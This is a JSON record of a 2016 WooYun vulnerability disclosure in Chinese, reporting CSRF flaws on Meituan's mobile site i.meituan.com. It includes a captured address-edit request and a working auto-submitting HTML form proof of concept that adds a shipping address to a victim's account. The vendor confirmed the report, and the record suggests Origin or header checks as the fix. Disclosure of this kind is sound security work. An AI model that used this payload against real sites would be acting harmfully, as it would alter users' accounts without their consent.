{"id": 85301, "wybug_id": "wooyun-2016-0170006", "wybug_title": "美团网多处CSRF", "wybug_corp": "美团网", "wybug_author": "Power", "wybug_date": "2016-01-18 16:06", "wybug_open_date": "2016-03-04 13:27", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-04：\t细节向公众公开  简要描述： CSRF 详细说明：  美团在主站www.meituan.com 中使用X-Requested-With(XHR不能跨域发送数据包时自动带入此头部)防止CSRF,Form提交数据的时候不能够构造此头部，但是XHR发包的时候会自动携带此头部。在i.meituan.com中虽然也会存在这个header 头部，但是删除之后依然可以进行正常数据包提交导致i.meituan.com中几乎所有的功能点都会存在CSRF漏洞。比如 收藏功能，订单取消功能(需要知道订单id)等等下面举例地址添加功能,收下抓一个正常的添加地址的包\nPOST /account/address/edit.json HTTP/1.1Host: i.meituan.comProxy-Connection: keep-aliveContent-Length: 163Accept: application/jsonOrigin: http://i.meituan.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://i.meituan.com/account/address/edit?stid=936873039291363072_b1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ********name=%E6%89%8B%E6%B3%95&phone=1111111116&province=110000&city=110000&district=110101&address=%E6%98%AF%E6%89%93%E5%8F%91%E5%8F%91%E5%8F%91%E5%A4%A7&zipcode=223323\n可以看到其中还添加了Origin头部，但是没啥卵用。测试POC如下\n<form name='poc1' action=\"http://i.meituan.com/account/address/edit.json\" method=\"post\"><input type=\"text\" name=\"name\" value=\"wocawocawoca\"><input type=\"text\" name=\"phone\" value=\"111111111\"><input type=\"text\" name=\"province\" value=\"110000\"><input type=\"text\" name=\"city\" value=\"110000\"><input type=\"text\" name=\"district\" value=\"110101\"><input type=\"text\" name=\"address\" value=\"wocawocawoca\" ><input type=\"text\" name=\"zipcode\" value=\"11111\" ><input type=\"text\" name=\"default\" value=\"\" ></form><script>poc1.submit();</script>\nPOC访问之后如下图\n\n查看地址管理中多出收货地址\n\n其它功能点还有很多，我就不一一测试了。   漏洞证明：  \n\n\n\n   修复方案：  Origin 头部 或者 X-Requested-With: XMLHttpRequest   版权声明：转载请注明来源 Power@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2016-01-19 15:39 厂商回复： 非常感谢您对美团安全的关注。如有问题，欢迎反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}